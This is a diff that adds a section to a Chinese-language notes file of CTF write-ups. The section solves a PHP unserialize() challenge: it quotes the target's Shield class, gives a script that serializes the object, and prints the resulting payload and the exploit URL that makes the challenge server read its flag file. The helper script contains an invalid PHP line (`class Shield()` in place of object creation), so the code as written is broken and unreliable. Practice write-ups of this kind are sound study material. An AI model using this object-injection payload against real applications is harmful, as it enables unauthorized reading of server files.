@@ -332,3 +332,43 @@ if($str==0){ echo "返回了true.";}
 资料：
 
 - [PHP中字符串和数字 0 比较为什么返回true？](https://zhidao.baidu.com/question/336186893.html)
+
+## 26 unserialize()序列化
+
+说明`flag`在`pctf.php`，但`showimg.php`中不允许直接读取`pctf.php`，只有在`index.php`中可以传入变量`class`
+，`index.php`中`Shield`类的实例`$X = unserialize($g)`，`$g = $_GET['class'];`，`$X`中不知`$filename`变量，但需要找的是：`$filename = "pctf.php"`，现`$X`已知，求传入的`class`变量值。
+可以进行序列化操作：
+```
+<!-- answer.php -->
+<?php
+
+require_once('shield.php');
+$x = class Shield();
+$g = serialize($x);
+echo $g;
+
+?>
+
+<!-- shield.php -->
+<?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = 'pctf.php') {
+            $this -> file = $filename;
+        }
+        
+        function readfile() {
+            if (!empty($this->file) && stripos($this->file,'..')===FALSE  
+            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
+                return @file_get_contents($this->file);
+            }
+        }
+    }
+?>
+
+```
+得到：
+`O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`
+构造：
+`http://web.jarvisoj.com:32768/index.php?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`
